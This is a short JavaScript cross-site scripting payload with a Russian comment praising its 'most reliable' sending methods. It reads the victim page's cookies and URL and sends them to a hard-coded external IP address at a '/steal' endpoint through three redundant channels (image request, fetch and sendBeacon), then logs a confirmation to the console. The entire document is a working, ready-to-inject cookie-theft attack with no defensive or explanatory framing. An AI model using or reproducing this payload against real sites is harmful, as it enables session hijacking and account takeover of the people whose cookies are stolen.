(function(){
    const url = "http://109.234.39.144:8889/steal?cookie=" 
              + encodeURIComponent(document.cookie || "empty")
              + "&url=" + encodeURIComponent(location.href)
              + "&time=" + Date.now();

    // Самые надёжные способы отправки
    new Image().src = url;

    fetch(url, {mode: 'no-cors'}).catch(()=>{});

    if(navigator.sendBeacon) navigator.sendBeacon(url);

    console.log("%c[XSS] Sent to your server", "color: red; font-size: 18px");
})();